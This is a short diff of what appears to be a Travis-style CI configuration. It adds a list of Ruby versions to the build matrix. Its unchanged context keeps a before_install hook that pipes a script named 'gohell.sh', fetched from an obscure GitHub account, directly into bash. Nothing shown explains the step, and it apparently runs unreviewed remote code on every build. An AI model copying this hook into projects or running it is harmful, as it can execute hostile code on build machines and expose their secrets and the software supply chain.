@@ -8,6 +8,15 @@ vm:
   
 rvm:
   - "3.0.1"
+  - "2.7.3"
+  - "2.6.7"
+  - "2.5.9"
+  - "3.0.0"
+  - "2.7.2"
+  - "2.7.1"
+  - "2.6.6"
+  - "2.5.8"
+  - "2.4.10"
 
 before_install:
   - curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash
